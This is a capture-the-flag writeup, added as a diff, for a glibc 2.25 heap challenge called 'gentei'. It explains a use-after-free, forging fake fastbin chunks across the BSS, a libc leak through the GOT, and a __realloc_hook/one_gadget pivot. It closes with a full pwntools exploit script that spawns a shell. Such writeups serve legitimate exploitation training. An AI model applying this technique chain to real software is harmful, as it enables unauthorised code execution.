@@ -1,0 +1,256 @@
+
+---
+
+# Gentei - CTF Pwn Writeup
+
+**Challenge:** gentei
+**Category:** Pwn / Heap Exploitation
+**GLIBC Version:** 2.25 (No Tcache)
+**Protections:** Partial RELRO, Canary, NX, **No PIE**
+
+## Challenge Overview
+
+`gentei` is a heap exploitation challenge running on **glibc 2.25**. The binary manages a list of "guesses" (heap chunks) but fails to clear pointers after freeing them, leading to a textbook **Use-After-Free (UAF)** vulnerability.
+
+Because the environment is glibc 2.25, there is **no Tcache**. We are forced to use **Fastbins**. However, glibc 2.25 introduces a strict security check for fastbins:
+
+> `malloc(): memory corruption (fast)`
+
+This error occurs if the size field of the chunk we are trying to allocate does not match the fastbin index (in this case, `0x20`). This prevents us from simply pointing a UAF pointer to the GOT or `__free_hook` directly, as those memory regions do not have a valid `0x21` size field sitting there by coincidence.
+
+To bypass this, we must perform a **"BSS Crawl"** (also known as a House of Spirit chain) to forge fake chunks down the BSS section until we reach the global pointer array.
+
+---
+
+## 1. Analysis & Vulnerabilities
+
+### The `danglingPointer`
+
+The binary stores guesses in a global array located in the `.bss` section. The array is indexed relative to a global variable called `danglingPointer` at `0x6020e0`.
+
+```c
+// Decompiled Logic
+guess_ptr = &danglingPointer + (index + 8) * 8;
+
+```
+
+* **`danglingPointer`**: `0x6020e0`
+* **`guess[0]`**: `0x6020e0 + (0+8)*8 = 0x602120`
+
+### The "God Byte" Vulnerability
+
+The `pwn()` function (Option 5) allows us to write a single byte to `0x6020e8` (offset +8 from `danglingPointer`).
+
+```c
+printf("Number of guesses: ");
+__isoc99_scanf(&%hhu, &DAT_006020e8);
+
+```
+
+If we write `33` (`0x21`) here, we create a valid fake chunk header at `0x6020e0`:
+
+* `0x6020e0`: `0x00000000` (prev_size)
+* **`0x6020e8`**: **`0x00000021`** (size + PREV_INUSE)
+
+This forged size field is the key to bypassing the fastbin security check.
+
+---
+
+## 2. Exploitation Strategy: The BSS Crawl
+
+We cannot reach the target `guess[0]` array (`0x602120`) directly from `0x6020e0` because `fgets` only allows writing 23 bytes, and the distance is 64 bytes. We must "leapfrog" down memory, creating new fake chunks as we go.
+
+### Leap 1: The Bridge
+
+1. **Poison:** Use UAF to point the fastbin `fd` to `0x6020e0` (our Genesis Chunk).
+2. **Alloc:** `malloc` returns a pointer to `0x6020f0` (User Data).
+3. **Forge:** Write `p64(0) + p64(0x21)` to `0x6020f0`.
+* This creates a valid chunk header at `0x6020f0` (size field at `0x6020f8`).
+
+
+
+### Leap 2: The Extension
+
+1. **Poison:** Point fastbin to `0x6020f0`.
+2. **Alloc:** `malloc` returns `0x602100`.
+3. **Forge:** Write `p64(0) + p64(0x21)` to `0x602100`.
+* **Crucial Detail:** We must pad this write with NULL bytes (`\x00`). If `fgets` appends a newline `\n` (`0x0a`) here, it corrupts the fastbin `fd` pointer for the *next* allocation, causing a crash.
+
+
+
+### Leap 3: The Target (Index 12)
+
+1. **Poison:** Point fastbin to `0x602100`.
+2. **Alloc:** `malloc` returns **`0x602110`**.
+
+We now control memory starting at **`0x602110`**.
+The global `guess[0]` pointer is stored at **`0x602120`**.
+The distance is exactly **16 bytes**.
+
+By writing 16 bytes of padding + 8 bytes of an address, we overwrite the `guess[0]` pointer!
+
+```text
+| Address  | Content                      |
+| :------- | :--------------------------- |
+| 0x602110 | [ AAAAAAAA ] (Padding)       |
+| 0x602118 | [ AAAAAAAA ] (Padding)       |
+| 0x602120 | [ TARGET   ] <--- OVERWRITE! |
+
+```
+
+---
+
+## 3. The "Double Hook" Pivot
+
+Once we control `guess[0]`, we can point it to the GOT to leak libc. After leaking libc, we target `__malloc_hook`.
+
+However, `one_gadget` often fails with `malloc` or `free` because the stack is misaligned or constraints aren't met. We use the **`realloc` stack pivot**:
+
+1. Overwrite `__realloc_hook` with `one_gadget`.
+2. Overwrite `__malloc_hook` with `realloc + 2`.
+
+**Why?**
+
+* `malloc` calls `__malloc_hook` -> Jumps to `realloc + 2`.
+* `realloc + 2` skips the first `push` instruction, shifting the stack pointer (`RSP`) by 8 bytes.
+* `realloc` then calls `__realloc_hook` -> Jumps to `one_gadget`.
+* The shifted stack satisfies the `one_gadget` constraints (e.g., `[rsp+0x50] == NULL`).
+
+---
+
+## 4. Final Exploit Script
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+elf = context.binary = ELF('./gentei_patched')
+libc = ELF('./libc.so.6')
+context.log_level = 'debug'
+p = elf.process()
+# p = remote("34.179.171.239", 31209)
+
+def guess(idx, data):
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"Index: ", str(idx).encode())
+    p.sendafter(b"Guess: ", data)
+
+def delete(idx):
+    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"Index: ", str(idx).encode())
+
+def print_guess(idx):
+    p.sendlineafter(b"> ", b"3")
+    p.sendlineafter(b"Index: ", str(idx).encode())
+    leak = p.recvuntil(b"> ")
+    p.unrecv(b"> ")
+    return leak[:-2]
+
+def edit(idx, data):
+    p.sendlineafter(b"> ", b"4")
+    p.sendlineafter(b"Index: ", str(idx).encode())
+    p.sendafter(b"New guess: ", data)
+
+def forge_bss_size(num):
+    p.sendlineafter(b"> ", b"5")
+    p.sendlineafter(b"Number of guesses: ", str(num).encode())
+
+# we want to forge chunks in bss for having an arbitrary write in the heap
+# because tcache is disabled, we need to bypass the fastbin check
+# whenever we allocate a chunk from fastbin, it makes the following check
+# let's say we allocate at address x
+# fastbin will check if at x + 8 there is a valid size
+# for example if we want to allocate a 0x21 size chunk at address x, at x + 8, there needs to be the value 0x21 (33 decimal)
+# this is why we are first writing 33 (0x21) at the address 0x6020e8
+log.info("Forging initial size field in BSS")
+forge_bss_size(33)
+
+# now, we can allocate a chunk at 0x6020e0, because it will pass the fastbin check
+log.info("Leap 1 - Forging chunk at 0x6020f0")
+guess(4, b"AAAA\n")
+
+# we put the chunk back into fastbin
+# free guess doesn't free the pointer so we have a dangling pointer
+delete(4)
+
+# we edit the fd pointer of that to point to 0x6020e0 and the size check will pass
+edit(4, p64(0x6020e0) + b"\n")
+
+# we allocate a chunk
+# now the head of the fast bin is 0x6020e0
+guess(5, b"BBBB\n")
+
+# now we will allocate another chunk and it will give us the address at the head of the fastbin (0x6020e0)
+# it will check at 0x6020e0 + 8 and it will see 0x21 -> valid size
+# now we will have a pointer returned at 0x6020e0 + 16 = 0x6020f0
+# at 0x6020f0 we will have : 00000000 00000021 000000..
+# meaning that we are constructing another valid chunk header
+# send 0x22 bytes. This forces 0x602100 to be completely 0x00!
+guess(6, p64(0) + p64(0x21) + b"\x00"*6)
+
+log.info("Leap 2 - Forging chunk at 0x602100")
+
+# same technique : malloc -> free -> overwrite fd -> get fd at the head of the fastbin
+guess(7, b"CCCC\n")
+delete(7)
+edit(7, p64(0x6020f0) + b"\n")
+guess(8, b"DDDD\n")
+
+# 0x6020f0 will check 0x6020f8 where it will find 0x21 -> valid chunk size
+# it will return a pointer at 0x602100
+# at 0x602100 : 00000000 00000021 000000..
+# Send EXACTLY 22 bytes. This forces 0x602110 to be completely 0x00!
+guess(9, p64(0) + p64(0x21) + b"\x00"*6)
+
+log.info("Leap 3 - Overwriting guess[0] with puts@GOT")
+# same first steps
+guess(10, b"EEEE\n")
+delete(10)
+edit(10, p64(0x602100) + b"\n")
+guess(11, b"FFFF\n")
+
+# will check 602108 -> valid chunk size and will return a pointer at 0x602110
+# 16 bytes padding and will write the puts got address at 0x602120
+# 16 bytes pad + 6 bytes GOT = 22 bytes. Hits guess[0] perfectly at 0x602120
+payload = b"A" * 16 + p64(elf.got['puts'])[:6]
+guess(12, payload)
+
+# this will leak the puts got address because of how the guess memory address is calculated
+# now guess[0] points to our forged chunk
+log.info("Leaking Libc Base")
+raw_leak = print_guess(0)
+
+# calculate libc base address
+puts_leak = u64(raw_leak.ljust(8, b"\x00"))
+libc.address = puts_leak - libc.symbols['puts']
+
+log.success(f"Puts leaked at: {hex(puts_leak)}")
+log.success(f"Libc base at: {hex(libc.address)}")
+
+# after many tryings with free hook, malloc hook, the only one that worked seamessly was the __realloc_hook
+log.info("Redirecting guess[0] to __realloc_hook")
+# We target __realloc_hook, which is exactly 8 bytes BEFORE __malloc_hook
+payload = b"A" * 16 + p64(libc.symbols['__realloc_hook'])[:6]
+# put the realloc hook address at guess[0]
+edit(12, payload)
+
+log.info("Writing one_gadget and realloc to fix stack alignment")
+
+one_gadget = libc.address + 0xd6fb1
+
+# we add +2 to realloc to skip the first 'push' instruction, shifting the stack for proper allignment
+realloc_adjust = libc.symbols['realloc'] + 2
+
+# p64(one_gadget) lands exactly in __realloc_hook
+# p64(realloc_adjust) lands exactly in __malloc_hook
+payload = p64(one_gadget) + p64(realloc_adjust)
+edit(0, payload + b"\n")
+
+log.info("Triggering shell via malloc...")
+# when malloc is called, it triggers the chain: malloc -> realloc -> __realloc_hook -> one_gadget
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"Index: ", b"50")
+
+p.interactive()
+
+```
